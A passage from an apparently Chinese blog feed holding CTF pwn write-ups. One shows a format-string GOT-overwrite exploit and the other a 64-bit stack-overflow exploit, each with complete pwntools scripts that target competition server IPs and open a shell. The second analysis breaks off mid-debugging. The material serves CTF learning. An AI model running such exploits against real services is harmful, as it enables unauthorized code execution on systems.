<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-70h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-Ch]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you know repeater?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞存在点</span>
    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>很显然的字符串格式化漏洞利用</p>
<p>先来进行测试偏移</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ./fmt 
Do you know repeater?
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA.0xffab5268.0x64.0xf7dc88fb.0xffab528e.0xffab538c.0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025
�a��
</code></pre>
<p>看到距离AAAA 6个偏移处得到地址0x41414141 </p>
<p>利用偏移地址打印，打印出got表 从而获得libc版本 进而获得system地址</p>
<p>leak puts_addr</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./fmt'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'fmt'</span><span class="token punctuation">)</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token operator">+</span><span class="token string">'%6$s'</span><span class="token operator">+</span><span class="token string">'#'</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
</code></pre>
<p>获取libc版本</p>
<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/1.jpg" alt="1"></p>
<p>计算获得system_addr</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">system_addr<span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
</code></pre>
<h3 id="EXP编写思路"><a href="#EXP编写思路" class="headerlink" title="EXP编写思路"></a>EXP编写思路</h3><ul>
<li><p>确定格式化字符串参数偏移</p>
</li>
<li><p>利用put@got获取put函数地址，进而获取对应的libc.so的版本，进而获取对应system函数地址。</p>
</li>
<li><p>修改printf@got的内容为system的地址。</p>
</li>
<li><p>当程序再次执行printf函数的时候，其实执行的是system函数。</p>
</li>
</ul>
<p>利用pwntools自带工具修改</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">payload1 <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>printf_got<span class="token punctuation">:</span> system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#p = process('./fmt')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'106.75.126.184'</span><span class="token punctuation">,</span><span class="token number">58579</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'fmt'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib32/libc.so.6'</span><span class="token punctuation">)</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token operator">+</span><span class="token string">'%6$s'</span><span class="token operator">+</span><span class="token string">'#'</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>


puts <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
system_addr<span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

payload1 <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>printf_got<span class="token punctuation">:</span> system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>

<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="fgo"><a href="#fgo" class="headerlink" title="fgo"></a>fgo</h3><p> pwnable.tw 原题</p>
<p>过几天认真做做==</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;第一场&quot;&gt;&lt;a href=&quot;#第一场&quot; class=&quot;headerlink&quot; title=&quot;第一场&quot;&gt;&lt;/a&gt;第一场&lt;/h2&gt;&lt;h3 id=&quot;GUESS&quot;&gt;&lt;a href=&quot;#GUESS&quot; class=&quot;headerlink&quot; title=&quot;GUESS&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>西电线下赛PWN-writeup</title>
    <link href="http://iosmosis.github.io/2018/07/23/%E8%A5%BF%E7%94%B5%E7%BA%BF%E4%B8%8B%E8%B5%9BPWN-writeup/"/>
    <id>http://iosmosis.github.io/2018/07/23/西电线下赛PWN-writeup/</id>
    <published>2018-07-22T18:25:32.000Z</published>
    <updated>2018-07-24T16:09:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>比赛结束了…垃圾的我拿了第六 菜归菜 但是也要继续学习orz</p>
<p>感谢每一位西电的学长</p>
<h2 id="PWN1-EZ"><a href="#PWN1-EZ" class="headerlink" title="PWN1  EZ"></a>PWN1  EZ</h2><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec ez
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/ez'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
    RWX:      Has RWX segments
</code></pre>
<p>保护全关 64位elf</p>
<p>我们IDA分析下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>

  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Guess what I think!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"233 or 666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">233</span> <span class="token punctuation">)</span>
    <span class="token function">sub_400726</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">666</span> <span class="token punctuation">)</span>
    <span class="token function">sub_400737</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">5438</span> <span class="token punctuation">)</span>
    <span class="token function">sub_400748</span><span class="token punctuation">(</span><span class="token number">5438LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>main函数中 读完代码你可以发现 puts(“233 or 666”);这里让你输入233或者666 对应内容也可以去跟进函数查看到，这里传入v4=5438时会跳转到sub_400748该函数 我们跟进分析下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_400748</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You find my secret!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So,Tell me your name!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have remembered you, %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">==</span> <span class="token number">233</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞很明显在read函数处  32位下的话应该是有两解变量覆盖及rop 具体可以参考iscc的WP <a href="http://www.lovei.org/archives/ISCC2018.html#pwn1" target="_blank" rel="noopener">ISCC-login</a> (ORZ)所以此题利用方式类似 就不在赘述了  （大晚上写wp有点累 偷个懒0.0）</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#p = process('ez')本地测试...</span>
<span class="token comment" spellcheck="true">#p = remote('192.168.3.222',10001)内网线下</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'118.25.227.117'</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#外网目前可用</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5438'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4007A1</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/23/西电线下赛PWN-writeup/1.jpg" alt="1"></p>
<h2 id="PWN2-stack-relro"><a href="#PWN2-stack-relro" class="headerlink" title="PWN2  stack-relro"></a>PWN2  stack-relro</h2><p>感谢因幡师傅 感谢去去去师傅~</p>
<p>顺便推一下如果你也喜欢CTF真的很推荐来西电 学长们很友好也很愿意耐心解答问题</p>
<p>那我们继续看题</p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec relro
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/relro'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre>
<p>开启 RELRO NX  </p>
<p>RELRO分为Full RELRO和Partial RELRO </p>
<p>开启<em>FULL_RELRO</em>后，GOT表只能读   限制了修改got表 </p>
<p>我们载入ida分析下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">_int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

  v5 <span class="token operator">=</span> a2<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">sub_4009D6</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token string">"Welcome to easy message system."</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to easy message system."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v7 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">sub_400A7F</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your choose: "</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v3 <span class="token operator">=</span> <span class="token string">"%d"</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token function">sub_400B70</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
        v3 <span class="token operator">=</span> <span class="token string">"Exit"</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v7 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token function">sub_400AC2</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token punctuation">:</span>
        v3 <span class="token operator">=</span> <span class="token string">"invalid choose"</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invalid choose"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dest <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dest <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里的高难度做法等回去继续学习0.0今晚用基本的来解题</p>
<p>找到存在漏洞函数 case 1:   sub_400AC2();</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>int sub_400AC2()
{
  int result; // eax
  char *v1; // rax
  char src; // [rsp+0h] [rbp-40h]

  memset(dest, 0, 0x100uLL);
  puts(&quot;Input your message:&quot;);
  if ( (unsigned int)sub_400BE1(&amp;src, 256LL) == -1 )
  {
    memset(dest, 0, 0x100uLL);
    v1 = dest;
    *(_QWORD *)dest = 7008762548701852247LL;
    *((_WORD *)v1 + 4) = 24948;
    result = puts(&quot;Error: read message failde.&quot;);
  }
  else
  {
    strncpy(dest, &amp;src, 0xFFuLL);
    result = puts(&quot;save message success.&quot;);
  }
  return result;
}
</code></pre><p>我们先看下sub_400BE1()</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">sub_400BE1</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+17h] [rbp-9h]</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v4 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v4 <span class="token operator">||</span> i <span class="token operator">==</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">||</span> buf <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>使用了read函数将buf逐个字节读入栈中</p>
<p>然后return回sub_400AC2()</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">strncpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">,</span> <span class="token number">0xFFuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>看到如果读入输入成功就执行strncpy()函数将栈中刚输入的字符串复制到堆中 由于char src大小固定所以这里会造成栈溢出</p>
<p>那我们可以来算一下偏移</p>
<p>在strncpy()函数处下断</p>
<p><img src="/2018/07/23/西电线下赛PWN-writeup/2.jpg" alt="2"></p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ <span class="token function">file</span> relro
Reading symbols from relro<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
gdb-peda$ b* 0x400B1B
Breakpoint 1 at 0x400b1b
gdb-peda$ r
Starting program: /home/ios/relro 
Welcome to easy message system.
--------------------
1. save message
2. show message
3. <span class="token keyword">exit</span>
--------------------
Your choose: 1
Input your message:
AAAA
</code></pre>
<p>得到当前寄存器的值</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
